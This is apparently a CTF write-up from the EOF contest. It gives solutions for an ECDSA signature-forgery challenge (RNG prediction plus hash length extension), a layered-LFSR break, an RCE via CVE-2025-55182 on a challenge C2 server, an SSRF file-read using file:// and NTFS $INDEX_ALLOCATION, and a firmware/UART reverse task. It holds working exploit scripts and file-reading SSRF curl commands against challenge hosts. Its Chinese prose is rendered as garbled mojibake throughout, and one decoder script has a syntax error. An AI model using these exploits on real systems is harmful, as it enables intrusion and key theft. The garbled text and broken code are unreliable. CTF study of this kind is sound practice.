    real = int(line.split("wOOF ")[1].split("'f")[0])
    pred = random.getrandbits(134) ^ random.getrandbits(134)
    io.recvuntil(b"option > ")

    if real != pred:
        raise RuntimeError(f"Sync mismatch: real={real}, pred={pred}")
    log.success("âœ… RNG sync verified")


def sign_once(io, msg_bytes):
    io.sendline(b"wowooF")
    io.sendline(msg_bytes.hex().encode())
    # server consumes k = getrandbits(255) exactly once here
    k = random.getrandbits(255)
    io.recvuntil(b"wwwooOf: ")
    r = int(io.recvline().strip(), 16)
    io.recvuntil(b"wwWooOf: ")
    s = int(io.recvline().strip(), 16)
    io.recvuntil(b"option > ")
    return k, r, s


def main():
    if args.REMOTE:
        io = remote('chals1.eof.ais3.org', 19081)
    else:
        io = process(["python3", "chal.py"])

    # --- Phase 1: sync MT RNG ---
    sync_rng(io, sample_count=300)

    # --- Phase 2: recover private key from two sigs on same msg ---
    log.info("Phase 2: recovering ECDSA private key")
    msg_base = b"A" * 16
    k1, r1, s1 = sign_once(io, msg_base)
    k2, r2, s2 = sign_once(io, msg_base)

    d = ((s1 * k1 - s2 * k2) * pow(r1 - r2, -1, n)) % n
    # z = (s*k - r*d) mod n (with overwhelming probability equals raw SHA256 digest)
    z_base = (s1 * k1 - r1 * d) % n
    log.success(f"Recovered d = {hex(d)}")

    # --- Phase 3: length extension + forge signature ---
    log.info("Phase 3: length extension + forge")
    target = b"i_am_the_king_of_the_dog"

    old_hash_hex = f"{z_base:064x}"
    new_hash_hex, new_msg = hashpumpy.hashpump(old_hash_hex, msg_base, target, 64)
    z_forged = int(new_hash_hex, 16) % n

    k_forge = 123456
    r_forge = (k_forge * G).x
    s_forge = (pow(k_forge, -1, n) * (z_forged + r_forge * d)) % n

    io.sendline(b"wowoOf")
    io.sendline(hex(r_forge).encode())
    io.sendline(hex(s_forge).encode())
    io.sendline(new_msg.hex().encode())

    io.interactive()


if __name__ == "__main__":
    main()
```

</Details>

#### Flag

![Flag](./image-8.png)

`EOF{once_a_wise_dog_said_:_hi_._but_he_didn't_know_why_:D}`

### LOL

#### é¡Œç›®æè¿°

é¡Œç›®åšäº†ä¸€å€‹è‡ªè£½çš„ LFSR ç–Š LFSR çš„éš¨æ©Ÿæ•¸ç”¢ç”Ÿå™¨ LOLï¼Œç„¶å¾Œå…ˆè¼¸å‡º 42 æ¬¡ `lol.rand()` ç•¶ä½œ `gift`ï¼Œå†ç”¨ä¸‹ä¸€æ¬¡ `lol.rand()` ç•¶ä½œ AES-CTR çš„ keyï¼Œå»åŠ å¯† flagï¼Œå°å‡º `gift` èˆ‡ `ct`ã€‚

æ‰€ä»¥æˆ‘å€‘çš„ç›®æ¨™æ˜¯ï¼šå¾ `gift` é‚„åŸå…§éƒ¨åƒæ•¸æˆ–é æ¸¬ä¸‹ä¸€æ¬¡è¼¸å‡ºï¼Œç„¶å¾Œæ¨å‡ºç¬¬ 43 æ¬¡è¼¸å‡º `lol.rand()`ï¼ˆAES keyï¼‰ï¼Œä¸¦è§£å¯† `ct` å¾—åˆ° flagã€‚

#### åˆ†æèˆ‡è§£æ³•

LFSR å°±æ˜¯æ­£å¸¸çš„ LFSRï¼Œè€Œ LOL æœ‰ï¼š

- $n = 16$ å€‹ LFSRï¼ˆæ¯å€‹ state æ˜¯ 16 bytes = 128 bitsï¼‰
- åŒä¸€å€‹ mask $P(x)$
- 16 å€‹ `taps[i]`ï¼Œæ¯å€‹æ˜¯ 0 ~ 255 çš„ byte
- æ¯æ¬¡è¼¸å‡ºä¸€å€‹ 128-bit æ•´æ•¸ $x$

```python
def clock(self):
    x = 0
    for t, l in zip(self.taps, self.lfsrs):
        for _ in range(t):
            l.clock()
        x ^= l.state
    self.lfsrs = [LFSR(self.lfsrs[0].mask, x)] + self.lfsrs[:-1]
    return x
```

å°æ–¼æ¯ä¸€è¼ª kï¼š

1. å°ç¬¬ i å€‹ LFSRï¼Œå…ˆ clock `taps[i]` æ¬¡
1. æŠŠæ‰€æœ‰ LFSR çš„æ–° state XOR èµ·ä¾†ç•¶ä½œè¼¸å‡º $x_k$
1. å³ç§» LFSR é™£åˆ—ï¼Œä¸¦æŠŠ $x_k$ æ”¾åˆ°ç¬¬ä¸€å€‹ LFSR

æˆ‘å€‘å¯ä»¥æŠŠ clock $t$ æ¬¡è¦–ç‚ºåœ¨ç’° $\mathbb{F}_2[X]/(P)$ è£¡ä¹˜ä¸Š $X^t$ã€‚è¨­ç¬¬ $k$ è¼ªé–‹å§‹æ™‚ç¬¬ $i$ å€‹ç‹€æ…‹ç‚º $S_i^{(k)}$ï¼Œå‰‡è¼¸å‡ºï¼š

$$
x_k=\sum_{i=0}^{15} S_i^{(k)}X^{t_i}
$$

åˆå› ç‚ºæ›´æ–°æœƒæŠŠè¼¸å‡ºå¡å›å»ä¸¦å³ç§»ï¼Œå¯ä»¥æ¨å‡ºï¼š

$$
S_i^{(k)} = x_{k-1-i}\cdot X^{\sum_{j=0}^{i-1}t_j}
$$

ä»£å›å»ï¼Œå¾—åˆ°å°è¼¸å‡ºåºåˆ—çš„é—œä¿‚ï¼š

$$
x_k+\sum_{i=0}^{15}x_{k-1-i}\cdot X^{T_i}\equiv 0 \mod{P(X)}
$$

å…¶ä¸­ $T_i = \sum_{j=0}^{i}t_j$ã€‚ä¹Ÿå°±æ˜¯ï¼Œ$x_k$ æ˜¯ä¸€å€‹ç·šæ€§éè¿´ï¼Œä½†ä¿‚æ•¸æ˜¯ $X^{T_i}$ï¼Œç”± taps æ±ºå®šã€‚

å¦‚æœæŸå€‹å¼å­åœ¨ $\mathbb{F}_2[X]/(P)$ è£¡ç­‰æ–¼ 0ï¼Œå°±ç­‰åƒ¹æ–¼åœ¨ $\mathbb{F}_2[X]$ è£¡è¢« $P(X)$ æ•´é™¤ã€‚æˆ‘å€‘å¾æœ€å¾Œä¸€å€‹ tap é–‹å§‹å‰ï¼šæ¯ä¸€æ­¥æŠŠéè¿´æ•´ç†æˆ

$$
D_k(t)=D_k^A + X^{R+t}\cdot D_k^B
$$

å…¶ä¸­ $D_k^A,D_k^B$ å¯ç”¨è¼¸å‡ºçµ„çŸ©é™£å– determinant ç®—å‡ºã€‚ç”¨å…©å€‹è¦–çª— $k, k+1$ åš

$$
g(t)=\gcd(D_k(t),D_{k+1}(t))
$$

æƒ $t\in[0,255]$ å– $\deg g(t)$ æœ€å¤§çš„å°±æ˜¯æ­£ç¢º tapï¼ˆçŒœå°æ™‚ gcd æœƒé•·å‡º degree 128 çš„å…±åŒå› å­ $P$ï¼‰ã€‚æ‰¾åˆ° tap å¾Œæ›´æ–°ç´¯ç© shift $R$ èˆ‡è¼”åŠ©é‡ $z_k$ï¼Œç¹¼çºŒè§£ä¸‹ä¸€å€‹ tap ç›´åˆ° 16 å€‹éƒ½æ‰¾åˆ°ã€‚

<Details summary="recover_taps.py">

```py
from sage.all import *


gift_bytes = b'\x0c\xf8\x1c(\xa7\xb0\n^p\xf5\xb4%dS\x8a\x0bv\x06\x13\x90\xb1\x86\xbb\x8aI\x87\xd5\x1f\xa2(\x87^\xc4\xdf\xd4tZ\xcae\x87\xf4~\xf3\x80\xf8\x93\x0e\xf05\x90f\xe6\xe9\x15\xd4\xd9\xda,j\xb9D$g\xd5\xffF8n7\x90:7\x96\xf9\x83\x17\xb3\xf9\xf1\xd0J\xcf\xa9mB\xb2|\x14Y\xb0\xd2ij\xf1\xde1\xb1\xb3=%\xa2;\xd1N\xc1\x89xY\xc1\xe4"[\x16\x9f\xa6\xad\xda\xfd/\xf3,\xd9i\xde\xac\x1e\x13\xceL\x91X+:\xf3\xf5\r\xea\x9f,\x9b\xf2\xfd8\xba\x94~-\x0ci\xb2\x8e5\xa4\xd0\\\xfd`(\xe1\x99-\xd0\x16\x1b`\xa1\xb8\xb25r\xe74@\xa9\x95\xa6]\x84)\xcc\xbe;\xeaI\x83\xee\xdb\xa3\xb9\x99\xc9*\x9d\xd8\x9cI\xf4-\x10`\x9b\x97>\xb8GzM\x0bc\xf6\x0b\x8c2Edk\xf8\xe7\'A\x86`\xce\x7f`\x0b\xff]\xbd\xca|\xab\xec\xd8\xa2\xeb\x9e\xf5Hp\xfa&bu \x16w\x91I\xef\x86\x8buE\\\xec\xfd\x97\x9c\ns\x1f\xac\xe1U\x93\xbc\xcf|\t\x98\xce\x8d\xb7\xbb\xf4\xb4\xca\xbb\xc1\x86\xa0H\x84C*+\xe5\\\xf1+\xfab\x86hB\xe8\x1duY\x14\xf4c2\xb1\x06/\x1e\x8eB\xdd\x99o\xf9G\xf0q\xab\x8aL\x8f\xd9z](R\xce-\xf0\xdc\x0c\x8c\x1c\x1f\\=\x0e\x8fg\x18\xd9c\xee\x92\xf8\xc1\xee\x0bo\x02\x12\xa0\xc7a\xa0\xb0-\xa6P5\xd1f\x95\x89\x83`\x1en\xde\x8c\xc1Q\xaf\'.\xf2`\x87[\xdc\xab|\x9e\xb4\xabn\xe0MJ\x8f\xcf\xdf\xc3u\xe66\x0e\xe1\xc6N24\xd8\xed\x17\x07\x8e\xa1\xeeK\xeb\xd9\x1bnK\xc2\x8e\x87\'XGy\xbc\xac\x19\xc4\xd9h:\xa5\xb5-\x9b\xa5\xd5\xb1z\xae\xd1\x0f\xd5\xa8\xb6\x174\x1d\x8b\x04\xc5\x0b\xc5\x9f\x1c\xd6*\xfc\xdaSq\x99:\x17!\xb9\xf6Q\xfb\x95\x1f\x9eEF\x87\xc6\xae\xc2\r\xd7\x1f\xecXK\x9d\xdd\x03\x82^?3\xfa\xce\xe1\xd4\xe2N\x9ab0\x06lR\xa9z\xe8\x0bA\xcd\n\x00\xeel\xf7\xf3\x06Q\x12\x88l\x84\xfc^\xbc\x908\xd3\x96.s\x02\xa0\xe3\x9aET\x83t\xb6\n\xea\xbe\xf4a\xf8\xd2<8AK\x0fT\xc0\x83#\xee\xff\x1c>4\xfc\x0e`"X\x88\xd5\x8e\x993\\rt\\|\'p-!\xf1\x13=\x98^z\x1f\xc9\xc2\x13:\xe4\x8a\xbe\x11;e\xe1uZ\x9eZ1\xc6tle,\x10\x1e\x80\xc9W\x81\x1b\xfd\x92\x07+\x04$\xca\x95\xd7\x1c\xb7\xc4\xba\xf8z\xe5\xfc\xdbLhB\x94>\xa5Z\x19*\xc9Y\xffY\xba\xd2:\xdb\xe3\xca.Kj\xfa=\x7fa\x13\x06\x1c\x9d\x8f\xa1\x9e\x9cgo\x0e\x0eN\xec\x1f\x0c'

outputs_int = []
for i in range(0, len(gift_bytes), 16):
    outputs_int.append(int.from_bytes(gift_bytes[i:i+16], 'big'))

R = GF(2)['x']
x = R.gen()


def int_to_poly(val): return R(Integer(val).digits(2))


outputs = [int_to_poly(v) for v in outputs_int]

n = 16
found_taps_rev = []
current_R = 0

z = {}
for k in range(n, len(outputs)):
    z[k] = outputs[k-n]

for m in range(n):
    tap_idx = n - 1 - m
    print(f"Solving for tap {tap_idx} (reverse step {m})...")

    dim = n - 1 - m

    if dim == 0:
        k1 = 16
        k2 = 17
        A1 = z[k1]
        B1 = outputs[k1]
        A2 = z[k2]
        B2 = outputs[k2]

        best_tap = -1
        best_deg = -1

        for t in range(256):
            R_val = current_R + t
            XS = x**R_val
            val1 = A1 + XS * B1
            val2 = A2 + XS * B2
            g = val1.gcd(val2)
            deg = g.degree()
            if deg > best_deg:
                best_deg = deg
                best_tap = t

        print(f"Found tap {tap_idx}: {best_tap} (deg {best_deg})")
        found_taps_rev.append(best_tap)
        break

    def get_vals(start_k):
        mat_fixed = []
        vec_A = []
        vec_B = []

        # Need dim+1 rows
        for i in range(dim + 1):
            k = start_k + i
            row = []
            for u in range(dim):
                row.append(outputs[k - u])
            mat_fixed.append(row)
            vec_A.append(z[k])
            vec_B.append(outputs[k - (n - 1 - m)])

        mat1 = []
        for r, a in zip(mat_fixed, vec_A):
            mat1.append(r + [a])
        M_A = Matrix(R, mat1)

        mat2 = []
        for r, b in zip(mat_fixed, vec_B):
            mat2.append(r + [b])
        M_B = Matrix(R, mat2)

        return M_A.determinant(), M_B.determinant()

    print("Computing determinants...")
    D1_A, D1_B = get_vals(16)
    D2_A, D2_B = get_vals(17)

    best_tap = -1
    best_deg = -1

    print("Scanning taps...")
    for t in range(256):
        R_val = current_R + t
        XS = x**R_val

        val1 = D1_A + XS * D1_B
        val2 = D2_A + XS * D2_B

        g = val1.gcd(val2)
        deg = g.degree()

        if deg > best_deg:
            best_deg = deg
            best_tap = t

    print(f"Found tap {tap_idx}: {best_tap} (deg {best_deg})")
    found_taps_rev.append(best_tap)
    current_R += best_tap

    XS = x**current_R
    for k in z:
        z[k] = z[k] + XS * outputs[k - (n - 1 - m)]

found_taps = found_taps_rev[::-1]
print("Found taps:", found_taps)
```

</Details>

![Taps](./image-9.png)

```
taps = [12, 148, 138, 34, 66, 53, 196, 204, 207, 203, 19, 218, 13, 171, 101, 88]
```

æœ‰ taps å¾Œç®—

$$
R_j=\sum_{p=j+1}^{15}t_p,\qquad R_{-1}=\sum_{p=0}^{15}t_p
$$

å°æ¯å€‹ $k \ge 16$ï¼š

$$
V_k=x_kX^{R_{-1}}+\sum_{j=0}^{15}x_{k-1-j}X^{R_j}\equiv 0\pmod P
$$

æ‰€ä»¥ $P\mid V_k$ï¼Œå–å¤šå€‹ $V_k$ çš„ gcd å°±å¾—åˆ° $P(X)$ï¼ˆdegree 128ï¼‰ã€‚

æœ€å¾Œæ¨å‡ºç¬¬ 43 æ¬¡è¼¸å‡ºï¼Œå° $k=42$ï¼š

$$
x_{42}X^{R_{-1}}+\sum_{j=0}^{15}x_{41-j}X^{R_j}\equiv 0\pmod P
$$

$$
x_{42}\equiv\left(\sum_{j=0}^{15}x_{41-j}X^{R_j}\right)\cdot X^{-R_{-1}} \pmod P
$$

åœ¨ quotient ring $\mathbb{F}_2[X]/(P)$ ç®—å‡º $x_{42}$ï¼Œè½‰æˆ 16 bytes ç•¶ AES keyï¼Œè§£é–‹ `ct` çµ‚æ–¼æ‹¿åˆ° flagã€‚

<Details summary="solve.py">

```py
import ast
from sage.all import GF, Integer, PolynomialRing
from Crypto.Cipher import AES

R = PolynomialRing(GF(2), "x")
x = R.gen()


def load(path):
    a = [ln.strip() for ln in open(path) if ln.strip()]
    return ast.literal_eval(a[0].split(" = ", 1)[1]), ast.literal_eval(a[1].split(" = ", 1)[1])


def i2p(v): return R(Integer(v).digits(2))


def p2i(p):
    r = 0
    for i, c in enumerate(p.list()):
        if int(c):
            r |= 1 << i
    return r


def Rs(taps):
    n = len(taps)
    Rv = [0] * n
    for j in range(n - 2, -1, -1):
        Rv[j] = Rv[j + 1] + taps[j + 1]
    return Rv, Rv[0] + taps[0]


def gcdP(out, taps):
    n = len(taps)
    Rv, Rm1 = Rs(taps)
    P = R(0)
    for k in range(n, len(out)):
        v = out[k] * (x ** Rm1)
        for j in range(n):
            v += out[k - 1 - j] * (x ** Rv[j])
        P = v if P == 0 else P.gcd(v)
    return P, Rv, Rm1


def next_key(out, P, Rv, Rm1):
    if int(P(0)) == 0:
        raise ValueError("P(0)=0")
    Q = R.quotient(P)
    xb = Q(x)
    S = R(0)
    for j in range(16):
        S += out[41 - j] * (x ** Rv[j])
    k = (Q(S) * (xb ** (-Rm1))).lift()
    return p2i(k).to_bytes(16, "big")


def main():
    taps = [12, 148, 138, 34, 66, 53, 196, 204, 207, 203, 19, 218, 13, 171, 101, 88]
    gift, ct = load("output.txt")
    out = [i2p(int.from_bytes(gift[i:i + 16], "big")) for i in range(0, len(gift), 16)]
    print(f"outputs = {len(out)} blocks")
    P, Rv, Rm1 = gcdP(out, taps)
    print(f"recovered gcd(P*) degree = {P.degree()}")
    key = next_key(out, P, Rv, Rm1)
    print(f"AES key = {key.hex()}")
    nonce, c = ct[:8], ct[8:]
    flag = AES.new(key, AES.MODE_CTR, nonce=nonce).decrypt(c)
    print(f"{flag=}")


if __name__ == "__main__":
    main()
```

</Details>

#### Flag

![Flag](./image-10.png)

`EOF{lfsr_is_a_linear_recurrence_so_is_lfsr_of_lfsr}`

é€™é¡ŒçœŸçš„å¥½é›£

## Web

### ä»¥å¤§æ–¹ç©ºé ­ä¾†å•¦ï¼

#### é¡Œç›®æè¿°

é€™é¡Œçµ¦çš„æ˜¯ä¸€å€‹å‡ç©ºæŠ•çš„æƒ¡æ„ç¶²ç«™ï¼Œç›®æ¨™æ˜¯æ‰¾åˆ°å¾Œé¢çš„ C2 server ç„¶å¾Œ RCE ä»–ã€‚

#### åˆ†æèˆ‡è§£æ³•

é¦–å…ˆçœ‹çœ‹ hint æ˜¯åŸå§‹ç¢¼æµå‡ºï¼š

![Hint](./image-3.png)

å¤ªæ€ªäº†ï¼Œç‚ºä»€éº¼è¦çµ¦ `package.json` å‘¢ï¼Œç¶²ç«™æ˜¯ç”¨ Next.js å¯«çš„ï¼Œæƒ³æƒ³å°±è¦ºå¾—ä¸å°å‹ï¼Œè©²ä¸æœƒæ˜¯ç†±é¨°é¨°çš„ [CVE-2025-55182](https://www.cve.org/CVERecord?id=CVE-2025-55182) å§ï¼Ÿæœç„¶ next ç‰ˆæœ¬æ˜¯ 15.5.1-canary.39 æœ‰ RCE æ¼æ´ã€‚

å…ˆä¾†åˆ†æä¸€ä¸‹ç¶²ç«™ï¼Œé–‹ developer tools æœƒè¢«å°åˆ° error pageï¼Œæˆ‘ç›´æ¥ç”¨ curl æŠ“çœ‹ `head` è£¡é¢æœ‰ä»€éº¼æ±è¥¿ï¼Œç™¼ç¾ he åŒ…æˆä¸€å€‹ VM äº†ï¼Œå™å™å™ï¼Œè®Šæˆ reverse äº† QQã€‚æœ€å¾Œæ‰¾åˆ°ï¼š

```html
<script src="/_next/static/chunks/app/page-a5d5f48bdef4decb.js" async=""></script>
```

![Next.js scripts](./image-4.png)

è£¡é¢æœ‰äº›å¾ˆç³Ÿç³•çš„æ±è¥¿ã€‚ç¸½ä¹‹æˆ‘åœ¨è£¡é¢ç™¼ç¾äº†é€™äº›è¢«æ··æ·†çš„ç¨‹å¼ç¢¼ï¼Œå…¶ä¸­ B å°±æ˜¯ C2 server urlï¼š

```js
function p(){let t=["YW5jZ","ZAS0A","29udH","XAAAA","3163775gkdyXZ","black","05e8p","5ZWf5","VFwmv","r:sha","nset-","hadow","å¾Œå†å˜—è©¦ã€‚","ç¢ºèªå¾Œå†è©¦","ute r","ext-w","ite","t jus","BYGl2","en ga","GrTlm","] fon","low-h","mt-0.","an-10","ç¢ºèªé€£æ¥â€¦",...];return(p=function(){return t})()}
function I(t,e){return t-=336,p()[t]}
!function(t,e){let i=I,s=t();for(;;)try{if(parseInt(i(891))/1*(parseInt(i(699))/2)+parseInt(i(945))/3+-parseInt(i(1289))/4*(parseInt(i(1147))/5)+-parseInt(i(1376))/6+parseInt(i(1387))/7+parseInt(i(849))/8*(parseInt(i(598))/9)+-parseInt(i(844))/10===741233)break;s.push(s.shift())}catch(t){s.push(s.shift())}}(p,0);
let T = I;
let B = (null != (N = T(1267) + T(1399) + T(1138) + T(469) + T(611)) ? N : T(1267) + T(1399) + "c.cha" + T(469) + T(611)).replace(/\/$/, "");
```

ç›´æ¥åŸ·è¡Œä»–å°±å¯ä»¥æ‹¿åˆ° C2 serverï¼š

```
https://rpc.chainpipes.uk
```

```js
let x = await t[T(445)](fetch, ""[T(591) + "t"](B, T(1026) + T(1298)), {
  method: t.tdteu,
  headers: R,
  body: JSON[T(1221) + T(642)](m),
});
```

é€™é‚Šä¹Ÿå¯ä»¥æ‰¾åˆ°ç™¼é€è«‹æ±‚çš„é‚è¼¯ï¼Œç™¼ç¾ä»–çš„å€¼æ˜¯ `/api/claim`ï¼Œä¸éé€™ä¸æ˜¯å¾ˆé‡è¦ï¼Œé‡é»æ˜¯ `https://rpc.chainpipes.uk` æœƒçµ¦ 500 ä¸”è¢«é˜²ç«ç‰†æ“‹æ‰ï¼Œä½† `https://rpc.chainpipes.uk/api` ç›´æ¥çµ¦æˆ‘å€‘ä¸€å€‹ next.js error pageï¼Œä»£è¡¨æˆ‘å€‘å¯ä»¥ç›´æ¥ RCE ä»–ï¼

![Error page](./image-5.png)

ç„¶å¾Œæˆ‘å°±å·äº† [zack0x01/vuln-app-CVE-2025-55182](https://github.com/zack0x01/vuln-app-CVE-2025-55182) çš„è…³æœ¬ç›´æ¥æ‰“å°±æˆåŠŸäº†ã€‚

#### Flag

![Flag](./image-6.png)

`EOF{Fr33_EIP7702_Sc43_with_EV3_Supp0r7~}`

### CookieMonster Viewer

#### é¡Œç›®æè¿°

çµ¦ä½ ä¸€å€‹ web appï¼Œå¯ä»¥è¼¸å…¥åå­—é‚„æœ‰åœ–ç‰‡äº”é¸ä¸€ï¼Œç„¶å¾Œæœƒé¡¯ç¤ºä¸€å€‹é è¦½ç•«é¢ã€‚åœ–ç‰‡çœ‹èµ·ä¾†æ˜¯ AI ç”Ÿçš„ï¼Œä¸éå¾ˆå¯æ„›ï¼Œ~~å¯¦åœ¨æ˜¯å€‹æ„ç¾©ä¸æ˜çš„ç¶²ç«™~~

![CookieMonster Viewer](./image-11.png)

#### åˆ†æèˆ‡è§£æ³•

é€™é¡Œæ˜¯ Qwertypig æŠŠå¤§éƒ¨åˆ†åšå®Œäº†å‰©æœ€å¾Œä¸€æ­¥æ˜¯æˆ‘åšçš„ï¼Œç¸½ä¹‹ç¶“éä¸€äº›å¾ˆå¯æ€•çš„åˆ†æå¾Œä»–ç™¼ç¾äº† `/api/preview` é€™å€‹ API å¯ä»¥è¢« SSRFï¼Œä¸¦ä¸”å¯ä»¥ç”¨ `file://` ä»»æ„è®€æª”æ¡ˆï¼ˆåœ¨å·²çŸ¥è·¯å¾‘çš„ç‹€æ³ä¸‹ï¼‰ï¼

```sh
curl -X POST "http://chals2.eof.ais3.org:20579/api/preview" \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///C:/supersecureyouwillneverguessed/Dockerfile", "username": "Guest"}'
```

å› æ­¤æˆ‘å€‘æ‹¿åˆ°äº† Dockerfileï¼š

```Dockerfile
FROM python:3.12-windowsservercore-ltsc2022

WORKDIR /supersecureyouwillneverguessed

COPY requirements.txt .
RUN python -m pip install --no-cache-dir -r requirements.txt

COPY . .

# First move the flag (while we have write access)
SHELL ["powershell", "-Command"]
RUN $rand = -join ((65..90) + (97..122) | Get-Random -Count 16 | ForEach-Object {[char]$_}); Move-Item C:\supersecureyouwillneverguessed\flag.txt C:\flag-$rand.txt; attrib +R (Get-Item C:\flag-*.txt).FullName

# Then lock down permissions
SHELL ["cmd", "/S", "/C"]
RUN net user /add appuser && \
    attrib +R C:\supersecureyouwillneverguessed\*.* /S && \
    icacls C:\supersecureyouwillneverguessed /grant appuser:(OI)(CI)(RX) /T && \
    icacls C:\supersecureyouwillneverguessed /deny appuser:(WD,AD,DC)

USER appuser
CMD ["python", "app.py"]
```

ä¸¦ä¸”ç™¼ç¾ flag è¢«ç§»å‹•åˆ° `C:\flag-<random>.txt`ï¼Œè€Œä¸”è¢«è¨­æˆå”¯è®€ï¼Œç„¶å¾Œæ•´å€‹å°ˆæ¡ˆç›®éŒ„è¢«é–æ‰å¯«å…¥æ¬Šé™ï¼Œåªçµ¦äº†ä¸€å€‹é admin çš„ `appuser` è®€å–æ¬Šé™ã€‚å•é¡Œåœ¨æˆ‘å€‘ä¸çŸ¥é“ flag çš„å®Œæ•´æª”åï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç›´æ¥ç”¨ `file://` è®€ã€‚æˆ‘è©¦äº†å¾ˆå¤š Windows çš„ path trick éƒ½ä¸è¡Œï¼Œä¾‹å¦‚ `FLAG~1.TXT` é€™æ¨£çš„çŸ­æª”åï¼Œæˆ–æ˜¯å»çœ‹å„ç¨® system log æƒ³æ‰¾å‡ºæª”åã€‚åˆæˆ–è€…å› ç‚ºæˆ‘æŸ¥åˆ° powershell çš„ rand é è¨­ seed æ˜¯é–‹æ©Ÿæ™‚é–“ï¼Œè€Œè©² instance æ˜¯å‰›é–‹æ©Ÿæ²’å¤šä¹…ï¼Œæ‰€ä»¥æˆ‘è©¦è‘—çˆ†æœ seed å¯èƒ½çš„æ™‚é–“ç¯„åœï¼Œä½†éƒ½æ²’æˆåŠŸã€‚

æœ€å¾Œçµ‚æ–¼æƒ³åˆ°å¯ä»¥ç”¨ NTFS çš„ `$INDEX_ALLOCATION` ä¾†è®€æ•´å€‹ç›®éŒ„çš„ indexï¼Œé€™æ¨£å°±å¯ä»¥åˆ—å‡ºæ‰€æœ‰æª”æ¡ˆåç¨±äº†ï¼

```sh
curl -X POST "http://chals2.eof.ais3.org:20189/api/preview" \
  -H "Content-Type: application/json" \
  -d '{"url": "file:///C:/::$INDEX_ALLOCATION", "username": "Guest"}'
```

![NTFS Index Allocation](./image-12.png)

è½èªªæ˜¯ unintended solutionï¼Œ~~å†æ¬¡è­‰æ˜äº† Windows æ˜¯å€‹å¥‡æ€ªçš„ç³»çµ±~~ã€‚

#### Flag

![Flag](./image-13.png)

`EOF{w0rst_f1t_4rg_1nj3ct10n_w/_format_string!}`

ç¥å¥‡çš„ç¹æ‰äº† format string çš„éƒ¨ä»½å°±è§£é–‹äº†ï¼Œå®˜è§£å…¶å¯¦è—åœ¨é¡Œæ•˜è£¡

> Cookie Monster has a collection of the BEST and WORST beautiful landscape photos that FIT his quirky tastes, but he keeps them very secure.
>
> Can you find a way to access his secret flag?

çš„å¤§å¯«å­—ï¼šBest Fit, Worst Fitï¼Œä½†å¥½éº»ç…©ä¸æƒ³åš XDã€‚

## Reverse

### bored

#### é¡Œç›®æè¿°

æä¾›äº†ä¸€ä»½è·‘åœ¨ LM3S6965 (ARM Cortex-M3) çš„éŸŒé«” `firmware.bin`ï¼Œå¦å¤–é‚„æœ‰ä¸€ä»½ UART waveformï¼ˆVCDï¼‰`signal.vcd`ï¼Œéœ€è¦å¾ä¸­é‚„åŸå¯¦éš›é€šè¨Šå…§å®¹ã€‚

#### åˆ†æèˆ‡è§£æ³•

ç”¨ ghidra æ‰“é–‹ `firmware.bin` å¾ˆå®¹æ˜“å¯ä»¥æ‰¾åˆ° `LAB_00000350` å°±æ˜¯ startup codeï¼Œtrace ä¸€ä¸‹å¯ä»¥æ‰¾åˆ° main function `FUN_000002a0`ï¼Œç°¡å–®é€†ä¸€ä¸‹å¤§æ¦‚æ˜¯é€™æ¨£ï¼š

![Reverse analysis](./image-1.png)

æ‰€ä»¥ä¸»æµç¨‹å°±æ˜¯è¼¸å…¥ä¸€å€‹å­—ä¸²ç•¶ RC4 keyï¼Œè¼¸å‡ºä¸€å€‹ const è·Ÿ RC4 keystream XOR å¾Œçš„çµæœã€‚const å¦‚ä¸‹ï¼š

```hex
a2 c3 9e cc 60 35 ee bf f5 7d 78 5a cd d5 c8 52
80 ae c6 19 56 f2 a7 cb d5 0b e1 61 b9 14
```

é‚£æ¥ä¸‹ä¾†å°±ç°¡å–®äº†ï¼Œæˆ‘æ‰‹ä¸Šæœ‰ UART æ³¢å½¢æª”ï¼Œå¯«ä¸€å€‹ decoder æŠŠæ³¢å½¢é‚„åŸæˆ bytesï¼š

<Details summary="decode.py">

```py
from bisect import bisect_right

VCD = "signal.vcd"
SYMBOL = "d"
BIT_NS = 104166
FRAME_NS = 10 * BIT_NS


def load_transitions(vcd_path: str, symbol: str):
    t = 0
    events = []
    with open(vcd_path, "r", errors="ignore") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if line.startswith("#"):
                t = int(line[1:])
            elif line[0] in "01" and line.endswith(symbol):
                events.append((t, int(line[0])))

    events.sort()
    trans = []
    for tt, vv in events:
        if not trans or trans[-1][1] != vv:
            trans.append((tt, vv))
    return trans


def make_sampler(trans):
    times = [t for t, _ in trans]
    vals = [v for _, v in trans]

    def value_at(time_ns: int, default_idle: int = 1) -> int:
        idx = bisect_right(times, time_ns) - 1
        return vals[idx] if idx >= 0 else default_idle

    return value_at


def decode_uart_8n1(trans, bit_ns: int) -> bytes:
    value_at = make_sampler(trans)
    frame_ns = 10 * bit_ns

    def decode_frame(t0: int):
        if value_at(t0) != 0:
            return None
        if value_at(t0 + bit_ns // 2) != 0:
            return None

        byte = 0
        for k in range(8):
            sample_t = t0 + int((1.5 + k) * bit_ns)
            byte |= (value_at(sample_t) << k)

        if value_at(t0 + int(9.5 * bit_ns)) != 1:
            return None
        return byte

    out = []
    i = 1
    t_scan = trans[0][0]
    end_t = trans[-1][0]

    while t_scan + frame_ns < end_t and i < len(trans)):
        while i < len(trans) and not (trans[i-1][1] == 1 and trans[i][1] == 0):
            i += 1
        if i >= len(trans):
            break

        t0 = trans[i][0]
        b = decode_frame(t0)

        if b is not None:
            out.append(b)
            t_scan = t0 + frame_ns
        else:
            t_scan = t0 + int(0.2 * bit_ns)

        while i < len(trans) and trans[i][0] < t_scan:
            i += 1

    return bytes(out)


def printable(bs: bytes) -> str:
    return "".join(chr(x) if 32 <= x <= 126 else "." for x in bs)


if __name__ == "__main__":
    trans = load_transitions(VCD, SYMBOL)
    uart = decode_uart_8n1(trans, BIT_NS)

    print("len:", len(uart))
    print("hex:", uart.hex(" "))
    print("latin1:", uart.decode("latin1"))
    print("printable:", printable(uart))
```

</Details>

```
b4r3MEt41
```

çœ‹èµ·ä¾†å¾ˆåƒ input keyï¼Œæœ€å¾Œå°±æ˜¯ RC4 è§£å¯†ï¼š

<Details summary="solve.py">

```py
def rc4_keystream(key_bytes, n):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key_bytes[i % len(key_bytes)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for _ in range(n):
        i = (i + 1) & 0xFF
        j = (j + S[i]) & 0xFF
        S[i], S[j] = S[j], S[i]
        out.append(S[(S[i] + S[j]) & 0xFF])
    return out


